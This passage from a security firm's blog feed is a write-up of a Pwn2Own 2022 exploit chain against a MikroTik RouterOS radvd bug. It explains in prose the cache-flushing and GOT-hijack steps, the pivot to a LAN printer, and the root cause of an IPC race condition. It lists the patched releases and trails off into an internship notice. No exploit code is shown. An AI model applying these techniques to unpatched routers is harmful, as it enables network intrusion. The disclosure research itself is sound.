&lt;p&gt;When we write the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jslr $sp&lt;/code&gt; instruction to the memory, it‚Äôs actually written to D-cache.
&lt;img src=&quot;/assets/img/blog/20240524/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we control the execution flow to jump on the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jslr $sp&lt;/code&gt;, the processor will first check whether the instruction at this address is in the I-cache or not, and since we jump to a data section, the cache will always miss it. And so, the contents of the memory will be loaded into the I-cache.
&lt;img src=&quot;/assets/img/blog/20240524/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, since the contents of the D-cache have not been written back to memory, I-cache will only copy a bunch of null bytes from memory, which is nop in MIPS, so the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; only runs a bunch of nop until it crashes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we need to make the processor write the contents of the D-cache back to memory, and there are two ways to do this: a context switch or exhausting the D-cache space (32 KB).&lt;/p&gt;

&lt;p&gt;Triggering a context switch is easier, but there is no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sleep&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; that we can use to trigger a context switch, and while other functions can trap into the kernel, the chances of a context switch occurring are not very high. In order to compete for the Pwn2Own, it is necessary to have a consistent attack that is close to 100% successful. Therefore, we turned to find a way to exhaust the 32kb D-cache.&lt;/p&gt;

&lt;p&gt;First , a simple check shows that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radomize_va_space&lt;/code&gt; variable of RouterOS is 1, which means that the memory address of the heap is not random, so we don‚Äôt need a leak to know where the heap is. We just need to find a way to make the heap allocate enough space, and then write some gibberish on it to deplete the 32kb D-cache.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, since there are no good ROP gadgets, such a payload will need too many ROP gadgets, and eventually the payload length may exceed the length we can cover.&lt;/p&gt;

&lt;p&gt;Luckily, as mentioned earlier, DNS itself is stored in a tree structure, so it already occupies a large chunk of memory in the heap. Through the step-by-step execution of gdb, we can make sure that by the time DNS is being processed, the heap is already bigger than 32kb, so we just need to call memcpy to write 32kb of gibberish to the heap through the GOT hijack and that‚Äôs it!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, our exploit is complete:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Combined with another Canon printer vulnerability we found for Pwn2Own, the attack flow would be:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The attacker, as a bad neighbor of the router, sends crafted ICMPv6 packets to it&lt;/li&gt;
  &lt;li&gt;After successfully controlling the router, we perform port forwarding to direct the payload to the Canon printer on the LAN.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In a Pwn2Own environment, the network environment can be simplified a bit as follows:
&lt;img src=&quot;/assets/img/blog/20240524/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;debugging-for-exploit&quot;&gt;Debugging for Exploit&lt;/h2&gt;

&lt;p&gt;Just when we thought we had the $100,000 prize in the pocket, something unexpected happened: our exploit failed on Ubuntu, whether it was a virtual machine in MacOS or an Ubuntu machine; and Pwn2Own officials, who basically used Ubuntu to execute our exploit, so we had to solve this problem.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We tried running the exploit on MacOS and recording the network traffic, then replaying the traffic on Ubuntu, and we can observe that the replay fails:
&lt;img src=&quot;/assets/img/blog/20240524/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We also tried running the exploit on Ubuntu and recording the network traffic, of course it failed on Ubuntu. But when we replayed the failed traffic on MacOS, it succeeded:
&lt;img src=&quot;/assets/img/blog/20240524/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Up to this point, we guessed that one of the OSes reordered the packets before sending them out, and that might have been done after Wireshark captured the packets. So we wrote a sniffer and put it on the router to monitor the traffic, and the result should be very reliable since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AF_PACKET&lt;/code&gt; type of sockets are not affected by the firewall rules:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the packets recorded from both sides are &lt;strong&gt;exactly the same&lt;/strong&gt; ‚Ä¶‚Ä¶&lt;/p&gt;

&lt;p&gt;So, apparently I‚Äôm the bus factor now. Exploit has only worked on my macOS so far, and if the situation remains, the last resort would be to fly myself to Toronto with my Mac laptop and do the attack on site with my own laptop. But there‚Äôs no way we‚Äôre going to leave this problem of unknown cause unattended, who knows if it might happen to my laptop during the Pwn2Own as well, and that would be a real loss.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a few careful reviews, we finally know the cause of the problem: speed. Since the time window between the two RA packets is not that big, it‚Äôs hard to tell from the Wireshark timeline, but if you do some math, you‚Äôll see that the difference in time between the two packets &lt;strong&gt;is 390 times&lt;/strong&gt;. So the problem is not with Ubuntu, it‚Äôs because the Mac sent the two packets too fast, and accidentally triggered the race condition in radvd (plus I didn‚Äôt properly calculate how many bytes it takes to overwrite the return address, I just wrote all the gibberish on it and did a pattern match. So the offset is only correct under the race condition).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The solution is to sleep for a while between sending two RA packets and fix the offset in the payload, which will stabilize our attack with a 100% chance of success.&lt;/p&gt;

&lt;h3 id=&quot;fix&quot;&gt;Fix&lt;/h3&gt;

&lt;p&gt;This vulnerability has been fixed in the following releases:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Long-term Release 6.48.7&lt;/li&gt;
  &lt;li&gt;Stable Release 6.49.8, 7.10&lt;/li&gt;
  &lt;li&gt;Testing Release 7.10rc6&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At the same time, we also found that this vulnerability has existed since RouterOS v6.0. From the official website can be found 6.0 release date is 2013-05-20, that is to say, this vulnerability has existed there &lt;strong&gt;nine years&lt;/strong&gt;, but no one has found him.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Echoing our initial thought, ‚ÄúNo one with sanity would like to dive into the details of nova binary‚Äù, Q.E.D.&lt;/p&gt;

&lt;h2 id=&quot;the-race-condition&quot;&gt;The Race Condition&lt;/h2&gt;

&lt;p&gt;But how did this race condition that prevents us from easily earning $100,000 happen? As mentioned above, nova binary has a Looper that loops for dealing with events, i.e. it‚Äôs a single thread program, so what‚Äôs the race condition all about? (Some nova binary is multi-fiber, but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; isn‚Äôt.)&lt;/p&gt;

&lt;p&gt;I didn‚Äôt mention that when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; parse the RA packets received from WAN, the DNS is stored in a ‚Äúvector‚Äù, but when preparing the RA packets for broadcasting on LAN, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addDNS&lt;/code&gt; expands a ‚Äútree‚Äù with DNS stored in it, so what is the relationship between this vector and the tree?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That‚Äôs why we didn‚Äôt find the logic ‚Äúbroadcasts RA packets to the LAN when it receives RA from the WAN‚Äù in the callback, because it‚Äôs the result of the interaction between the two processes.&lt;/p&gt;

&lt;p&gt;If we take a closer look at what the callback does, we can see that there is an array that holds an object called the ‚Äúremote object‚Äù. The code looks intuitive, it iterates over a vector of DNS addresses, calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::roDNS&lt;/code&gt; once for each DNS address, and saves the result of the function execution in the and saves the result of the function execution in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS_remoteObject&lt;/code&gt; vector.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-object&quot;&gt;Remote Object&lt;/h3&gt;

&lt;p&gt;So what is a remote object? Remote object is a mechanism used in RouterOS to share resources across processes, one process is responsible for storing this shared resource, then another process can send requests to the process responsible for storing it to make additions, deletions, and modifications by specifying the ids. For example, the DNS remote object is actually placed in handler 2 of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; process, while handler 1 of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; simply keeps the ids of these objects.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;subscription-and-notification&quot;&gt;Subscription and Notification&lt;/h3&gt;

&lt;p&gt;When a remote object is updated, some process may want to respond, so the nova binary can subscribe to other nova binary in advance. Take &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; for example, handler 1 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; is responsible for managing the ipv6 address pool, the dhcp process subscribes to handler 1 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt;, so when there are changes in the ipv6 address pool, dhcp can check whether they need to be processed further, such as shutting down a dhcp server.&lt;/p&gt;

&lt;p&gt;The subscription behavior is achieved by sending a nova message to the binary that wants to subscribe, with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_NOTIFYCMD&lt;/code&gt; that contains the specific conditions that it wants to be notified about.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When another process adds an object to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt;, handler 1‚Äôs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdAddObj&lt;/code&gt; function will be executed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In most cases, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddObj&lt;/code&gt; will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendNotifies&lt;/code&gt; to notify subscribers who have subscribed to the 0xfe000b event that their subscribed objects have been altered, so &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ippool6&lt;/code&gt; here sends a nova message to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; process informing it of the result of the object being altered.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After understanding the subscription mechanism, we can more fully understand the interaction between radvd and the resolver as follows:&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; receives the RA packet from the WAN, it will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; for each IPv6 address. Handler 4 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; handles this request and creates the corresponding ipv6 object in handler 2. Then, because handler 1 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; subscribes to handler 2 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;, handler 2 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; pushes all the DNS addresses that it has to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;, then handler 1 constructs a RA packet based on the DNS address he received, and then broadcasts the packet on the LAN.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-root-cause-of-race-condition&quot;&gt;The Root Cause of Race Condition&lt;/h3&gt;

&lt;p&gt;The problem is actually in the implementation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt;, where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roDNS&lt;/code&gt; uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt; to send a nova message. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt; is non-blocking, meaning that the remote object in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; doesn‚Äôt immediately know what id of a remote object corresponds to in the resolver.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If our second packet arrives too soon, so that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; doesn‚Äôt know what the remote object‚Äôs id is, then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; can‚Äôt delete these objects in the first place, it can only mark them as destroyed for soft deletion, which results in a race condition.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let‚Äôs try to understand the whole process step by step:&lt;/p&gt;

&lt;p&gt;First, since both processes are single thread, we can assume that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; are in their first loop. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; receives an RA from the WAN with only one DNS address, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; sends a request for creating a remote object to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the same time, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; will set a timer when it receives the first request, because in the IPC mechanism, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; has no way of knowing how many &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddObj&lt;/code&gt; requests belong to the same group, so it simply sets a timer , and sends out a notification when the time is up. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; should reply with a nova message as a response, informing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; of the id of the remote object that has just been added, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; will register a corresponding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResponseHandler&lt;/code&gt; to handle this request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, if the second RA packet is delivered so fast that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; hasn‚Äôt sent the response back yet, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; can only mark the old DNS remote object as destroyed for soft deletion first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; proceeds to create a new DNS remote object for the RDNSS field in the second RA packet received, but since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; hasn‚Äôt finished the first iteration yet, this new request stays in the socket until the next iteration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/73.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Going back to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;, the first iteration ends by passing back an id to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;‚Äôs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResponseHandler&lt;/code&gt; will update the remote object based on the id it gets. But since the corresponding remote object has been marked for deletion, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResponseHandler&lt;/code&gt; will delete the object instead of updating the object id.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/74.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResponseHandler&lt;/code&gt; deletes the remote object saved in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt;, it will send a delete object message to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;, informing it that the corresponding remote object is no longer in use and has to be deleted, but the request will still be stuck in the socket waiting to be processed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; then proceeds to the second iteration, where it gets a request from the socket to create a remote object for the second RA.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At this point, the previously set timer expires and the resolver calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::Handler::sendChanges&lt;/code&gt; to notify all subscribers what DNSs the resolver now knows about, since object 1 has not been deleted yet, so the resolver pushes the DNS that was created by the two requests. The DNS created by the two requests will be pushed out.&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; receives this information, it immediately constructs a RA packet to broadcast over the LAN, and the results of the two requests are mixed together, which is why our attack only succeeds on MacOS in the first place.&lt;/p&gt;

&lt;p&gt;The race condition itself sounds hard to be triggered (it won‚Äôt be triggered if the delete request is processed before the timer), but this is because the whole process has been greatly simplified for ease of explanation, and in fact, as long as the time between the arrival of the two packets is short enough, the race will be successful.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;summary-1&quot;&gt;Summary&lt;/h3&gt;

&lt;p&gt;Through the above analysis, we found a pattern of race conditions in the remote object mechanism of RouterOS:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Use non-blocking methods to create/delete the remote object&lt;/li&gt;
  &lt;li&gt;Subscribe to the remote object&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Because it is possible to mix the results of two requests into a single response, this could possibly be used to bypass some security checks. If we can find such a vulnerability, it could be used to participate in the router category.&lt;/p&gt;

&lt;p&gt;In the end, we were pressed for time and we didn‚Äôt find any exploitable vulnerabilities through the race condition.&lt;/p&gt;

&lt;p&gt;And not only that, we realized that the exploit that we had tested hundreds of times over the past few months still had some issues, and we still couldn‚Äôt get it to work three hours before the registration deadline. We kept updating the exploit and the white paper we were going to submit, and it was done until half an hour before the deadline (4:00 AM deadline).&lt;/p&gt;

&lt;p&gt;But luckily, we were able to complete the attack with only one attempt at Pwn2Own, becoming the first team in history to complete the new category of SOHO SMASHUP:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We earned 10 Master of Pwn points and $100,000 by this category, and at the end of the tournament, DEVCORE was crowned the winner with 18.5 Master of Pwn points.
&lt;img src=&quot;/assets/img/blog/20240524/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In addition to receiving the Master of Pwn title, trophy, and jacket, the organizers will also send us one of each of the devices we hacked.&lt;/p&gt;

&lt;p&gt;(We can‚Äôt fit all of them into a picture)
&lt;img src=&quot;/assets/img/blog/20240524/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this study, we have explored RouterOS in depth and revealed a security vulnerability that has been hidden in RouterOS for nine years. In addition, we found a design pattern in IPC that leads to a race condition. Meanwhile, we also open-source the tools used in the research at https://github.com/terrynini/routeros-tools for your reference.&lt;/p&gt;

&lt;p&gt;Through this paper, DEVCORE hopes to share our discoveries and experiences to help white hat hackers gain a deeper understanding of RouterOS and make it more understandable.&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros-en/</link>
                <guid>https://devco.re/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros-en</guid>
                <pubDate>Fri, 24 May 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2024 Á¨¨‰∫îÂ±ÜÂØ¶ÁøíÁîüË®àÁï´</title>
                <description>&lt;p&gt;DEVCORE ÂâµÁ´ãËøÑ‰ªäÂ∑≤ÈÄæÂçÅÂπ¥ÔºåÊåÅÁ∫åÂ∞àÊ≥®ÊñºÊèê‰æõ‰∏ªÂãïÂºèË≥áÂÆâÊúçÂãôÔºå‰∏¶Ëá¥ÂäõÂ∞ãÊâæÂêÑÁ®ÆÂÆâÂÖ®È¢®Èö™ÂèäÊºèÊ¥ûÔºåËÆì‰∏ñÁïåËÆäÂæóÊõ¥ÂÆâÂÖ®„ÄÇÁÇ∫‰∫ÜÊåÅÁ∫åÂ∞ãÊâæÊõ¥Â§öÊìÅÊúâÁõ∏ÂêåÁêÜÂøµÁöÑË≥áÂÆâÊñ∞Èä≥„ÄÅÂçîÂä©Â≠∏ÁîüÂª∫ÊßãÊ≠£Á¢∫Ë≥áÂÆâÊÑèË≠òÂèäÊäÄËÉΩÔºåÊàëÂÄëÊàêÁ´ã‰∫Ü„ÄåÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçÔºå2022 Âπ¥Âàù‰πüÈñãÂßãËàâËæ¶È¶ñÂ±ÜÂØ¶ÁøíÁîüË®àÁï´ÔºåÁõÆÂâçÁÇ∫Ê≠¢ÊàêÊûúÈ†óË±ê„ÄÅË∂Ö‰πéÈ†êÊúüÔºåÁ¨¨ÂõõÂ±ÜÂØ¶ÁøíÁîüË®àÁï´‰πüÂ∞áÊñº‰ªäÂπ¥ 1 ÊúàÂ∫ïÂëä‰∏ÄÊÆµËêΩ„ÄÇÊàëÂÄëÂæàÊ¶ÆÂπ∏Âú∞ÂÆ£‰ΩàÔºåÁ¨¨‰∫îÂ±ÜÂØ¶ÁøíÁîüË®àÁï´Âç≥Â∞áÁôªÂ†¥ÔºåËã•ÊÇ®ÊúüÂæÖÂä†ÂÖ•ÊàëÂÄë„ÄÅÁ≤æÈÄ≤Ë≥áÂÆâÊäÄËÉΩÔºåÁÖ©Ë´ãË©≥Èñ±‰∏ãÂàóË≥áË®äÂæå‰æÜ‰ø°Â†±ÂêçÔºÅ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÂÖßÂÆπ&quot;&gt;ÂØ¶ÁøíÂÖßÂÆπ&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÂØ¶ÁøíÂàÜÁÇ∫ Binary Âèä Web ÂÖ©ÂÄãÁµÑÂà•Ôºå‰∏ªË¶ÅÂÖßÂÆπÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
‰ª•Á†îÁ©∂ÁÇ∫‰∏ªÔºåÂú®ËàáÂ∞éÂ∏´Á¢∫ÂÆöÁ†îÁ©∂Ê®ôÁöÑÂæåÔºåÂàÜÊûêÁõÆÊ®ôÊû∂Êßã„ÄÅÈÄ≤Ë°åÈÄÜÂêëÂ∑•Á®ãÊàñÁ®ãÂºèÁ¢ºÂØ©Êü•„ÄÇËóâÁî±ÈÄôÂÄãÈÅéÁ®ãË®ìÁ∑¥Ëá™Â∑±ÁöÑÊÄùË∑ØÔºåÊâæÂá∫ÂèØËÉΩÁöÑÊîªÊìäÈù¢ËàáÊΩõÂú®ÁöÑÂº±Èªû„ÄÇÂè¶Â§ñ‰πüÊúÉËÆìÂ§ßÂÆ∂ÂòóË©¶ÂàÜÊûêÂèäÂØ´ÈÅéÂæÄÊºèÊ¥ûÁöÑ ExploitÔºåÁêÜËß£ÈÅéÂéªÊºèÊ¥ûÈÉΩÂá∫ÁèæÂú®Âì™ÔºåÈ´îÈ©óÁúüÂØ¶‰∏ñÁïåÁöÑÊºèÊ¥ûÈÉΩÊòØÂ¶Ç‰ΩïÂà©Áî®„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥ûÊåñÊéòÂèäÁ†îÁ©∂ 70 %&lt;/li&gt;
      &lt;li&gt;1-day ÈñãÁôº (Exploitation) 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
Â∞éÂ∏´ÊúÉËàáÂ≠∏ÁîüË®éË´ñ‰∏¶Á¢∫ÂÆö‰∏ÄÂÄã‰ª•Â≠∏ÁîüÁöÑÊúüÊúõÁÇ∫‰∏ªÁöÑÂØ¶ÁøíÁõÆÊ®ôÔºå‰∏¶Âú®ÈÅéÁ®ãËºîÂ∞éÊàêÈï∑‰ª•ÂÆåÊàêÁõÆÊ®ôÔºåÂÖßÂÆπÂèØ‰ª•ÊòØÊ∑±ÂÖ•Á†îÁ©∂ËøëÂπ¥Â∏∏Ë¶ãÊñ∞ÂûãÊÖãÊºèÊ¥û„ÄÅÊîªÊìäÊâãÊ≥ï„ÄÅÈñãÊ∫êËªüÈ´îÔºåÊàñÊòØÁ®ãÂºèË™ûË®ÄÁîüÊÖãÁ≥ªÁöÑÂ∏∏Ë¶ãÂº±ÈªûÔºå‰∫¶ÊàñÊòØÂ±ïÁèæ‰Ω†ÁöÑÊäÄË°ìÂäõ‰ª•ÈñãÁôºËàáÁ¥ÖÈöäÁõ∏ÈóúÁöÑÂ∑•ÂÖ∑„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥û„ÄÅÊîªÊìäÊâãÊ≥ïÊàñÈñãÁôºÂ∑•ÂÖ∑Á†îÁ©∂ 90%&lt;/li&gt;
      &lt;li&gt;ÊàêÊûúÂ†±ÂëäËàáÊ∫ñÂÇô 10%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂÖ¨Âè∏Âú∞Èªû&quot;&gt;ÂÖ¨Âè∏Âú∞Èªû&lt;/h3&gt;

&lt;p&gt;Âè∞ÂåóÂ∏ÇÊùæÂ±±ÂçÄÂÖ´Âæ∑Ë∑Ø‰∏âÊÆµ 32 Ëôü 13 Ê®ì&lt;/p&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊôÇÈñì&quot;&gt;ÂØ¶ÁøíÊôÇÈñì&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2024 Âπ¥ 3 ÊúàÈñãÂßãÂà∞ 2024 Âπ¥ 7 ÊúàÂ∫ïÔºåÂÖ± 5 ÂÄãÊúà„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊØèÈÄ±Â∑•‰ΩúÂÖ©Â§©ÔºåÂ∑•‰ΩúÊôÇÈñìÁÇ∫ 10:00 ‚Äì 18:00
    &lt;ul&gt;
